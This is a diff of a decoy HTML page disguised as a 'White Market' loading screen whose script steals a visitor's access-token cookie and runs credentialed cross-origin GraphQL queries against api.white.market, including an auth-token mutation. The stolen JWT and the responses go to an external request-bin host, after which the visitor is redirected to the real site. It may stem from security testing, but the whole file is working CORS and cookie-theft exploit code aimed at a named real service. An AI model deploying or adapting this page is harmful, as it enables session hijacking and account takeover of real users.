@@ -3,41 +3,65 @@
 <head><title>White Market</title></head>
 <body>
 <h1>Loading...</h1>
+<div id="status"></div>
 <script>
-// Method 1: Try direct cookie theft
+const status = document.getElementById('status');
+const REQUESTBIN = 'https://eo5dlnbgif530n8.m.pipedream.net';
+
+// Check cookies
 const localCookies = document.cookie;
+status.innerHTML = 'Checking cookies...<br>';
+
 if (localCookies.includes('access-token')) {
     const jwt = localCookies.split(';').find(c => c.includes('access-token')).split('=')[1];
-    fetch('https://webhook.site/ca40a8c2-76e4-4463-97f8-b46cddb37a84', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({method: 'direct_cookie', jwt: jwt})
-    });
+    status.innerHTML += 'JWT FOUND (direct theft)!<br>';
+    fetch(REQUESTBIN + '?method=direct_cookie&jwt=' + encodeURIComponent(jwt.substring(0, 200)));
+} else {
+    status.innerHTML += 'No JWT in cookies<br>';
+    fetch(REQUESTBIN + '?method=direct_cookie&result=no_cookie_leaked');
 }
 
-// Method 2: CORS attack - use the working query from your Burp test
-fetch('https://api.white.market/graphql/api', {
-    method: 'POST',
-    credentials: 'include',
-    headers: {
-        'Content-Type': 'application/json',
-        'x-accept-language': 'en_US'
+// Try multiple CORS queries
+const queries = [
+    {
+        name: 'basic_query',
+        query: 'query{__typename}',
+        operationName: 'BasicQuery'
     },
-    body: JSON.stringify({
-        query: 'query UrgentAndUnreadNotifications { unread: notification_list_paginated(search: { isRead: false }) { totalCount } }',
-        operationName: 'UrgentAndUnreadNotifications'
-    })
-})
-.then(r => r.json())
-.then(d => {
-    fetch('https://eo5dlnbgif530n8.m.pipedream.net', {
+    {
+        name: 'auth_token_mutation',
+        query: 'mutation AuthToken { auth_token { accessToken } }',
+        operationName: 'AuthToken'
+    }
+];
+
+queries.forEach(q => {
+    fetch('https://api.white.market/graphql/api', {
         method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({method: 'cors_notifications', data: d})
+        credentials: 'include',
+        headers: {
+            'Content-Type': 'application/json',
+            'x-accept-language': 'en_US'
+        },
+        body: JSON.stringify({
+            query: q.query,
+            operationName: q.operationName
+        })
+    })
+    .then(r => r.json())
+    .then(d => {
+        console.log(q.name + ':', d);
+        status.innerHTML += q.name + ': ' + JSON.stringify(d).substring(0, 100) + '...<br>';
+        
+        fetch(REQUESTBIN + '?method=' + q.name + '&data=' + encodeURIComponent(JSON.stringify(d)));
+    })
+    .catch(e => {
+        console.error(q.name + ' error:', e);
+        status.innerHTML += q.name + ' ERROR<br>';
     });
 });
 
-setTimeout(() => window.location.href = 'https://white.market', 3000);
+setTimeout(() => window.location.href = 'https://white.market', 8000);
 </script>
 </body>
 </html>
